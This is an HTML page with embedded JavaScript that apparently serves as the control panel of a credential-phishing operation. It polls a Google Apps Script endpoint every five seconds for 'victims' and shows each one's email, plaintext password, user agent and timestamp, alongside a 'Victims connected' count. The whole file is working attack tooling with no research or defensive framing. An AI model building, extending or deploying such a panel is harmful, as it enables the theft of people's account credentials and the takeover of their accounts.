<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Prompt Relay Control</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #0d1117;
      color: #c9d1d9;
      margin: 0;
      padding: 20px;
      line-height: 1.5;
    }
    .container {
      max-width: 1000px;
      margin: 0 auto;
    }
    h1 {
      color: #58a6ff;
      margin-bottom: 0.4em;
    }
    #status {
      font-size: 1.1rem;
      padding: 12px 16px;
      border-radius: 6px;
      background: #161b22;
      border: 1px solid #30363d;
      margin: 16px 0;
    }
    #status.fetching  { background: #21262d; }
    #status.success   { border-color: #238636; color: #7ee787; }
    #status.error     { border-color: #da3633; color: #f85149; }
    #status.empty     { color: #8b949e; }

    #raw-response {
      margin-top: 24px;
      padding: 16px;
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 6px;
      font-family: 'Consolas', 'Courier New', monospace;
      white-space: pre-wrap;
      word-break: break-all;
      max-height: 400px;
      overflow-y: auto;
      color: #a5d6ff;
    }

    #victims-table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 6px;
    }
    #victims-table th,
    #victims-table td {
      padding: 12px 14px;
      text-align: left;
      border-bottom: 1px solid #30363d;
    }
    #victims-table th {
      background: #0d1117;
      color: #8b949e;
    }
    #victims-table tr:hover {
      background: #1f2937;
    }

    #last-update {
      color: #8b949e;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Prompt Relay Control</h1>

    <div id="status" class="fetching">Fetching victims...</div>

    <div id="raw-response">
      <strong>Raw response from script (for debugging):</strong><br>
      (nothing received yet)
    </div>

    <table id="victims-table" style="display: none;">
      <thead>
        <tr>
          <th>Timestamp</th>
          <th>Email</th>
          <th>Status</th>
          <th>User Agent</th>
          <th>Password</th>
        </tr>
      </thead>
      <tbody id="victims-body"></tbody>
    </table>

    <div style="margin-top: 2rem; color: #8b949e; font-size: 0.95rem;">
      Last update: <span id="last-update">—</span> • Polling every 5 seconds
    </div>
  </div>

  <script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzMcaCzi5Cja5WzhFKhl6O2ypdS8BfWwkyoxIenPP22LjqlMpT0pMbEkUAkiK9ZzZFW/exec";

    const statusEl     = document.getElementById('status');
    const rawEl        = document.getElementById('raw-response');
    const tableEl      = document.getElementById('victims-table');
    const tbodyEl      = document.getElementById('victims-body');
    const lastUpdateEl = document.getElementById('last-update');

    async function fetchVictims() {
      statusEl.textContent = "Fetching victims...";
      statusEl.className = "fetching";

      try {
        const url = `${SCRIPT_URL}?getVictims=true`;
        const res = await fetch(url, {
          cache: 'no-cache',
          headers: { 'Accept': 'application/json, text/plain, */*' }
        });

        const text = await res.text();

        // Show raw response no matter what
        rawEl.innerHTML = `<strong>Raw response from script:</strong><br>${escapeHtml(text || '(empty response)')}`;

        if (!text.trim()) {
          showEmpty("Empty response from script");
          return;
        }

        let data;
        try {
          data = JSON.parse(text);
        } catch (e) {
          // Not valid JSON → show what we have anyway
          showRawAsFallback(text);
          return;
        }

        // Try common field patterns
        const victims = data.victims || data.entries || data.data || data || [];

        if (Array.isArray(victims) && victims.length > 0) {
          renderVictims(victims);
        } else {
          showEmpty("No victims found in response");
        }

      } catch (err) {
        const msg = err.name === 'TypeError' ? 'Network or CORS issue' : err.message;
        statusEl.textContent = `Error: ${msg}`;
        statusEl.className = "error";
        rawEl.innerHTML += `<br><span style="color:#f85149;">Fetch failed: ${escapeHtml(err.message)}</span>`;
      }
    }

    function renderVictims(items) {
      tbodyEl.innerHTML = '';
      items.forEach(item => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${escapeHtml(item.timestamp || item.time || '—')}</td>
          <td>${escapeHtml(item.email || '—')}</td>
          <td>${escapeHtml(item.status || item.Stat || '—')}</td>
          <td title="${escapeHtml(item.userAgent || '')}">${escapeHtml((item.userAgent || '—').slice(0,70))}</td>
          <td>${escapeHtml(item.password || item.pass || '—')}</td>
        `;
        tbodyEl.appendChild(tr);
      });

      tableEl.style.display = 'table';
      statusEl.textContent = `Victims connected: ${items.length}`;
      statusEl.className = "success";
      lastUpdateEl.textContent = new Date().toLocaleTimeString();
    }

    function showEmpty(msg) {
      statusEl.textContent = msg;
      statusEl.className = "empty";
      tableEl.style.display = 'none';
      lastUpdateEl.textContent = new Date().toLocaleTimeString();
    }

    function showRawAsFallback(raw) {
      statusEl.textContent = "Response received but not valid JSON";
      statusEl.className = "error";
      rawEl.innerHTML += `<br><br><strong>Fallback view (raw text):</strong><br>${escapeHtml(raw)}`;
      tableEl.style.display = 'none';
      lastUpdateEl.textContent = new Date().toLocaleTimeString();
    }

    function escapeHtml(unsafe) {
      return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
    }

    // Start
    fetchVictims();
    setInterval(fetchVictims, 5000);
  </script>
</body>
</html>


    
